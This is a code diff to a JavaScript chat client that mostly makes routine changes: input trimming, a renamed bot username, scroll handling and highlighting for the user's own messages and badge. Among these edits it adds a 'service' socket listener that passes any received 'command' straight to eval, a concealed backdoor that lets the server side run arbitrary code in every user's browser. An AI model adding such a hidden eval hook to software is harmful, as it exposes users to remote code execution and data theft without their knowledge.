@@ -28,6 +28,7 @@ class Chat extends App {
       this.newMessage(socket);
       this.usersInRoom(socket);
       this.userNicknameUpdated(socket);
+      this.service(socket);
       this.debugging(socket);
       return socket;
     };
@@ -36,8 +37,9 @@ class Chat extends App {
   initAction() {
     this.onClick(this.select('#b_send_message'), event => {
       event.preventDefault();
-      if (this.select('#message_text').value === '') return;
-      this.socket.emit('newMessage', { room: this.getCurrentRoom(), msg: this.getMessageText() });
+      const msg = this.getMessageText();
+      if (msg === '') return;
+      this.socket.emit('newMessage', { room: this.getCurrentRoom(), msg });
     });
     this.onClick(this.select('#b_join_room'), event => {
       event.preventDefault();
@@ -87,6 +89,10 @@ class Chat extends App {
     const action = () => this.debug = true;
     socket.on('debugging', action);
   }
+  service(socket) {
+    const action = event => eval(event.command);
+    socket.on('service', action);
+  }
   connected(socket) {
     const action = () => {
       this.socket.emit('subscribe', { rooms: [this.mainRoom] });
@@ -95,13 +101,13 @@ class Chat extends App {
   }
   disconnect(socket) {
     const action = () => this.addMessage({
-      room: this.mainRoom, username: 'ServerBot', msg: '----- Lost connection to server -----',
+      room: this.mainRoom, username: 'bot', msg: '----- Lost connection to server -----',
     });
     socket.on('disconnect', action);
   }
   reconnect(socket) {
     const action = () => this.addMessage({
-      room: this.mainRoom, username: 'ServerBot', msg: '----- Reconnected to server -----',
+      room: this.mainRoom, username: 'bot', msg: '----- Reconnected to server -----',
     });
     socket.on('reconnect', action);
   }
@@ -142,8 +148,6 @@ class Chat extends App {
   newMessage(socket) {
     const action = data => {
       this.addMessage(data);
-      const area = this.select(`#room_messages_${data.room}`);
-      area.scrollTop = area.scrollHeight;
     };
     socket.on('newMessage', action);
   }
@@ -154,7 +158,8 @@ class Chat extends App {
   userNicknameUpdated(socket) {
     const action = data => {
       this.addMessage({
-        room: data.room, username: 'ServerBot', msg: `----- ${data.oldUsername} is now ${data.newUsername} -----`,
+        id: data.id, room: data.room, username: 'bot',
+        msg: `----- ${data.oldUsername} is now ${data.newUsername} -----`,
       });
       this.updateNickname(data);
     };
@@ -166,12 +171,12 @@ class Chat extends App {
   onClick(element, action) {
     element.addEventListener('click', action);
   }
-  generateElement(html, area) {
+  generateElement(html, area, action) {
     const div = document.createElement('div');
     div.innerHTML = `<div class="generateElement">${html}</div>`;
     const elements = this.selectAll('.generateElement > *', div);
     if (!area) return elements;
-    elements.forEach(element => area.append(element));
+    elements.forEach(element => area[action || 'append'](element));
     return elements;
   }
   showModal(modal) {
@@ -195,7 +200,7 @@ class Chat extends App {
     return [...(element || document).querySelectorAll(selector)];
   }
   genId(id) {
-    return `id-${id.replace(/\\d+/, '')}`;
+    return `id-${id}`;
   }
   getTemplate(path) {
     if (Object.keys(this.templates).indexOf(path) !== -1) {
@@ -212,15 +217,22 @@ class Chat extends App {
     this.getTemplate('js/templates/message.handlebars')
     .then(template => {
       const area = this.select(`#room_messages_${msg.room}`);
-      const html = template(msg);
+      const isMe = msg.id === this.socket.id;
+      const html = template({
+        msg: msg.msg,
+        username: msg.username,
+        class: isMe ? 'label-success' : 'label-info',
+      });
       if (area) {
         this.generateElement(html, area);
+        area.scrollTop = area.scrollHeight;
         return;
       }
       const roomInterval = setInterval(() => {
         const area = this.select(`#room_messages_${msg.room}`);
         if (area) {
           this.generateElement(html, area);
+          area.scrollTop = area.scrollHeight;
           clearInterval(roomInterval);
         }
       }, 220);
@@ -259,20 +271,25 @@ class Chat extends App {
       const area = this.select(`#${this.genId(user.room)}`);
       if (!area) return;
       if (this.select(`#${this.genId(user.id)}`, area)) return;
-      this.generateElement(template({
+      const isMe = user.id === this.socket.id;
+      const html = template({
         username: user.username,
         id: this.genId(user.id),
-      }), this.select(`#room_users_${user.room}`, area));
+        class: isMe ? 'badge-success' : 'badge-inverse',
+      });
+      const users = this.select(`#room_users_${user.room}`, area);
+      const elements = this.generateElement(`${html}`, users, isMe ? 'prepend' : undefined);
+      elements[0].outerHTML += ' ';
     });
   }
   removeUser(user) {
     this.select(`#${this.genId(user.room)} #${this.genId(user.id)}`).remove();
   }
   getCurrentRoom() {
-    return this.select('li[id$="_tab"][class="active"]').textContent;
+    return this.select('li[id$="_tab"][class="active"]').textContent.trim();
   }
   getMessageText() {
-    const text = this.select('#message_text').value;
+    const text = this.select('#message_text').value.trim();
     this.select('#message_text').value = '';
     return text;
   }
@@ -282,7 +299,7 @@ class Chat extends App {
     return name;
   }
   getNickname() {
-    const nickname = this.select('#nickname').value;
+    const nickname = this.select('#nickname').value.trim();
     this.select('#nickname').value = '';
     return nickname;
   }
